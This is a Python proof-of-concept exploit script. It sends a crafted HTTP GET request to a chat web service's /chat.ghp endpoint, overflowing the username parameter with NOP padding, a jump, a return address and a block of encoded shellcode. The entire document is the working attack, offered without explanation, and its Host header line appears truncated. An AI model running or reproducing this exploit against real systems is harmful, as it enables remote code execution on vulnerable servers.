#!/usr/bin/python

import socket 
import struct

target_ip = '192.168.0.134'
target_port = 80
jmp_esp= struct.pack("<I", 0x1000227F)

exploit = '\x90' * 216 # offset minus 4 bytes
exploit += '\xEB\x06\x90\x90' # jump 8 bytes
exploit += jmp_esp # pop, pop, retn instruction location
exploit += '\x90' * 16 # NOP sled 

shellcode = "\x89\xe6\xdb\xc2\xd9\x76\xf4\x59\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37"
shellcode += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
shellcode += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
shellcode += "\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x6a\x69\x61\x59"
shellcode += "\x46\x51\x6b\x62\x6d\x33\x32\x67\x33\x62\x51\x78\x73"
shellcode += "\x53\x51\x71\x70\x6c\x43\x53\x4d\x59\x4a\x46\x43\x62"
shellcode += "\x42\x76\x55\x34\x6e\x6b\x74\x32\x34\x70\x4e\x6b\x72"
shellcode += "\x56\x34\x4c\x4c\x4b\x51\x66\x36\x6c\x6e\x4d\x4e\x6b"
shellcode += "\x56\x50\x4c\x4b\x53\x4e\x62\x38\x4e\x6b\x73\x6f\x47"
shellcode += "\x4c\x6c\x4b\x51\x4c\x45\x4f\x63\x48\x4c\x4b\x74\x34"
shellcode += "\x55\x4f\x61\x30\x55\x51\x69\x6e\x6e\x6b\x62\x6c\x35"
shellcode += "\x4f\x76\x44\x65\x51\x69\x69\x34\x4f\x68\x37\x44\x6c"
shellcode += "\x63\x61\x71\x52\x4e\x4d\x6b\x31\x57\x4c\x73\x37\x51"
shellcode += "\x47\x45\x39\x70\x6e\x32\x65\x50\x75\x39\x61\x4c\x4b"
shellcode += "\x32\x54\x67\x6f\x67\x6c\x33\x31\x69\x6e\x43\x33\x37"
shellcode += "\x4c\x4c\x6e\x4b\x4f\x4a\x77\x31\x7a\x65\x30\x51\x4a"
shellcode += "\x35\x38\x43\x53\x30\x61\x72\x4c\x30\x63\x52\x74\x30"
shellcode += "\x59\x73\x78\x6e\x63\x68\x6c\x71\x38\x62\x45\x72\x68"
shellcode += "\x4e\x6b\x70\x32\x62\x68\x4e\x6b\x34\x36\x57\x68\x52"
shellcode += "\x68\x4e\x6b\x61\x66\x46\x70\x50\x48\x6e\x4d\x57\x38"
shellcode += "\x4c\x4b\x34\x70\x43\x78\x4c\x4b\x31\x6e\x66\x50\x34"
shellcode += "\x43\x70\x57\x37\x4c\x6e\x6b\x33\x6c\x46\x77\x61\x38"
shellcode += "\x6e\x6b\x44\x34\x35\x4f\x37\x50\x71\x58\x45\x51\x4b"
shellcode += "\x4e\x6c\x4b\x56\x34\x67\x6f\x56\x44\x66\x6f\x6d\x67"
shellcode += "\x36\x4c\x76\x77\x4c\x4d\x53\x62\x56\x62\x4e\x4d\x4d"
shellcode += "\x51\x35\x6c\x37\x77\x61\x47\x32\x49\x52\x4e\x37\x35"
shellcode += "\x52\x55\x58\x6f\x6e\x6b\x74\x34\x67\x6f\x57\x6c\x70"
shellcode += "\x48\x57\x71\x39\x6e\x4e\x6b\x35\x64\x6c\x6e\x33\x78"
shellcode += "\x63\x31\x4a\x57\x6a\x39\x69\x6f\x49\x47\x41\x41"


buffer = 'GET /chat.ghp?username=' + exploit + shellcode + '&password=test&room=1&sex=1 HTTP/1.1\r\n'
buffer += 'Host: 192.	\r\n\r\n'  

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target_ip,target_port))
s.send(buffer + '\r\n\r\n')
s.close()